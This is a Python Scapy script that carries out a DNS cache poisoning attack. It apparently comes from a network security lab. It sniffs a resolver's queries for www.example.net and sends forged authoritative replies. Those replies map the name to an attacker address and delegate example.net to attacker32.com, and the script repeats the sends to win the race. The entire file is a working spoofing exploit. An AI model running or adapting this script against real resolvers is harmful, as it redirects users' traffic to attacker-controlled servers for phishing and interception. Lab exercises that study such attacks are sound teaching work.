#!/usr/bin/env python3
from scapy.all import *
import time

def spoof_dns(pkt):
    try:
        print(f"Query: {pkt[DNS].qd.qname}")
        
        if(DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname):
            print("[+] Target query detected!")
            
            # Use authoritative DNS server IP
            IPpkt = IP(dst='10.10.27.2', src='199.43.135.53')
            
            UDPpkt = UDP(dport=53, sport=53)

            # Answer Section
            Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='20.0.6.14')

            # Authority Section
            NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')

            # Additional Section
            Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='20.0.8.27')

            # Construct DNS packet
            DNSpkt = DNS(
                id=pkt[DNS].id, 
                qd=pkt[DNS].qd, 
                aa=1,
                rd=0,
                qr=1,
                qdcount=1, 
                ancount=1, 
                nscount=1, 
                arcount=1, 
                an=Anssec, 
                ns=NSsec1, 
                ar=Addsec1
            )

            # Send spoofed response
            spoofpkt = IPpkt/UDPpkt/DNSpkt
            print("[+] Sending spoofed DNS response...")
            send(spoofpkt, iface="br-8f1148536672", verbose=0)
            
            # Send multiple packets to increase success rate
            for i in range(3):
                send(spoofpkt, iface="br-8f1148536672", verbose=0)
                time.sleep(0.01)
                
    except Exception as e:
        print(f"Error: {e}")

print("[*] Starting DNS cache poisoning attack...")
print("[*] Target: www.example.net -> 20.0.6.14")
print("[*] Waiting for DNS queries...")

# Sniff and respond immediately
sniff(filter='udp and dst port 53 and src host 10.10.27.2', 
      prn=spoof_dns, 
      iface="br-8f1148536672",
      count=10,
      timeout=15)
